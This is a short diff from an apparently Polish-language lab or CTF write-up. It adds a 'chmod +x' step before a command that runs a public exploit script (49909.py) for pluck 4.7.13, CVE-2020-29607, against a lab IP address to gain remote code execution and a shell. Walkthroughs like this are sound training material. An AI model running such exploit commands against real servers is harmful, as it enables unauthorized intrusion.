@@ -71,6 +71,9 @@ CVE: 2020-29607
 
 Jak widzimy, aplikacja jest podatna. Możemy zyskać RCE, czyli zdalnie wykonywać kod na serwerze. Pobieramy exploit, nadajemy mu uprawnienia i go uruchamiamy:
 ```
+chmod +x 49909.py
+```
+```
 python 49909.py 10.10.223.148 80 password /app/pluck-4.7.13
 ```
 Uzyskujemy w ten sposób shella:
